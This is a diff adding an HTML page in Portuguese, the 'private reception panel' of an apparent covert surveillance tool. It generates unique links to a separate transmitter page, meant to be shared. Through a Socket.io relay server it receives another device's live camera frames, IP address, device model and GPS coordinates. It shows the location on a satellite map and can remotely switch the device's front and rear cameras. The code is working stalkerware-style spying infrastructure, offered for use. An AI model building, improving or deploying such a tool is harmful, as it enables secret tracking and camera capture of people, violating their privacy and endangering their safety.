@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CENTRAL TÁTICA // RECEPTOR</title>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<style>
+  :root {
+    --bg-dark: #030712; --panel-bg: rgba(6, 15, 25, 0.85);
+    --neon-green: #10b981; --neon-cyan: #06b6d4; --neon-red: #ef4444;
+    --border-color: rgba(6, 182, 212, 0.25); --font-mono: monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: var(--font-mono); color: #e2e8f0; background: var(--bg-dark); padding: 12px; }
+  .app { max-width: 1200px; margin: 0 auto; display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  @media (max-width: 900px) { .app { grid-template-columns: 1fr; } }
+  .terminal-card { background: var(--panel-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 14px; }
+  header.terminal-card { grid-column: 1 / -1; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+  .pill { font-size: 0.75rem; padding: 4px 10px; border-radius: 4px; background: rgba(6, 182, 212, 0.1); border: 1px solid var(--border-color); color: var(--neon-cyan); }
+  .dot { width: 8px; height: 8px; border-radius: 50%; background: #64748b; display: inline-block; }
+  .dot.on { background: var(--neon-green); box-shadow: 0 0 10px var(--neon-green); }
+  .player { width: 100%; aspect-ratio: 4/3; background: #000; border: 1px solid var(--border-color); border-radius: 6px; overflow: hidden; position: relative; }
+  .player img { width: 100%; height: 100%; object-fit: contain; display: none; }
+  .player .placeholder { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; color: #475569; text-align: center; }
+  .hacker-btn { padding: 8px 12px; border: 1px solid var(--border-color); background: rgba(6, 182, 212, 0.1); color: #fff; font-size: 0.75rem; cursor: pointer; border-radius: 4px; }
+  .hacker-btn:hover { background: rgba(6, 182, 212, 0.3); }
+  #map { width: 100%; height: 320px; border-radius: 6px; border: 1px solid var(--border-color); margin-top: 10px; }
+  .link-box { grid-column: 1 / -1; background: rgba(16, 185, 129, 0.05); border: 1px solid var(--neon-green); padding: 12px; border-radius: 6px; display: flex; gap: 10px; align-items: center; }
+  .link-input { flex: 1; padding: 8px; background: #000; border: 1px solid var(--border-color); color: var(--neon-green); font-family: monospace; font-size: 0.8rem; }
+  .radar-icon { width: 18px; height: 18px; border-radius: 50%; background: var(--neon-cyan); box-shadow: 0 0 15px var(--neon-cyan); border: 2px solid #fff; }
+</style>
+</head>
+<body>
+
+<div class="app">
+  <header class="terminal-card">
+    <h1>[PAINEL DE RECEPÇÃO PRIVADO]</h1>
+    <div>
+      <span class="pill" id="txIpPill">IP: ---</span>
+      <span class="pill" id="devicePill">APARELHO: ---</span>
+      <span class="pill"><span class="dot" id="statusDot"></span> <span id="statusText">AGUARDANDO</span></span>
+    </div>
+  </header>
+
+  <div class="link-box">
+    <button class="hacker-btn" id="btnGenLink" style="background:var(--neon-green); color:#000; font-weight:bold;">GERAR NOVO LINK ÚNICO</button>
+    <input type="text" class="link-input" id="generatedLink" readonly placeholder="Clique no botão para gerar o link exclusivo...">
+    <button class="hacker-btn" id="btnCopy">COPIAR</button>
+  </div>
+
+  <section class="terminal-card">
+    <div class="player">
+      <div class="placeholder" id="placeholder">AGUARDANDO TRANSMISSOR CONECTAR...</div>
+      <img id="remoteImg">
+    </div>
+    <div style="display:flex; gap:8px; margin-top:10px;">
+      <button class="hacker-btn" id="btnCamEnv" style="flex:1;">CÂMERA TRASEIRA</button>
+      <button class="hacker-btn" id="btnCamUser" style="flex:1;">CÂMERA FRONTAL</button>
+    </div>
+  </section>
+
+  <section class="terminal-card">
+    <div id="map"></div>
+  </section>
+</div>
+
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+
+<script>
+  // ✅ SEU SERVIDOR DO RENDER
+  const RENDER_URL = "https://maestro-server-si1f.onrender.com";
+  
+  // ✅ ENDEREÇO CORRETO DO TRANSMISSOR COM INDEX.HTML
+  const TRANSMITTER_BASE_URL = "https://valtonplay4-sudo.github.io/trasm/index.html";
+
+  let currentRoomId = 'sala_' + Math.random().toString(36).substring(2, 9);
+  
+  const socket = io(RENDER_URL, { transports: ['websocket', 'polling'] });
+
+  socket.on('connect', () => {
+    socket.emit('join-room', currentRoomId);
+  });
+
+  const linkInput = document.getElementById('generatedLink');
+  
+  function updateLinkDisplay() {
+    linkInput.value = `${TRANSMITTER_BASE_URL}?id=${currentRoomId}`;
+  }
+
+  document.getElementById('btnGenLink').addEventListener('click', () => {
+    currentRoomId = 'sala_' + Math.random().toString(36).substring(2, 9);
+    socket.emit('join-room', currentRoomId);
+    updateLinkDisplay();
+  });
+
+  // Já exibe o primeiro link ao carregar a página
+  updateLinkDisplay();
+
+  document.getElementById('btnCopy').addEventListener('click', () => {
+    if (!linkInput.value) return;
+    navigator.clipboard.writeText(linkInput.value);
+    alert("Link copiado com sucesso!");
+  });
+
+  const map = L.map('map').setView([0, 0], 2);
+  L.tileLayer('https://mt1.google.com/vt/lyrs=s&x={x}&y={y}&z={z}', { maxZoom: 20 }).addTo(map);
+  const radarIcon = L.divIcon({ className: '', html: '<div class="radar-icon"></div>', iconSize: [18, 18] });
+  let marker = null;
+
+  // Recebe Frames de Vídeo em Tempo Real
+  socket.on('receive-frame', (data) => {
+    const frame = typeof data === 'object' ? data.frame : data;
+    document.getElementById('placeholder').style.display = 'none';
+    const img = document.getElementById('remoteImg');
+    img.src = frame;
+    img.style.display = 'block';
+    document.getElementById('statusDot').className = 'dot on';
+    document.getElementById('statusText').textContent = 'ONLINE';
+  });
+
+  // Recebe Informações do Dispositivo
+  socket.on('receive-info', (data) => {
+    const info = data.info || data;
+    if (info.ip) document.getElementById('txIpPill').textContent = `IP: ${info.ip}`;
+    if (info.deviceModel) document.getElementById('devicePill').textContent = `APARELHO: ${info.deviceModel}`;
+  });
+
+  // Recebe Posição do GPS em Tempo Real
+  socket.on('receive-location', (data) => {
+    const loc = data.location || data;
+    if (loc && loc.lat) {
+      const latLng = [loc.lat, loc.lng];
+      if (!marker) {
+        marker = L.marker(latLng, { icon: radarIcon }).addTo(map);
+        map.setView(latLng, 18);
+      } else {
+        marker.setLatLng(latLng);
+      }
+    }
+  });
+
+  // Comandos para alternar câmera
+  document.getElementById('btnCamEnv').addEventListener('click', () => {
+    socket.emit('send-command', { roomId: currentRoomId, command: 'environment' });
+  });
+  document.getElementById('btnCamUser').addEventListener('click', () => {
+    socket.emit('send-command', { roomId: currentRoomId, command: 'user' });
+  });
+</script>
+</body>
+</html>
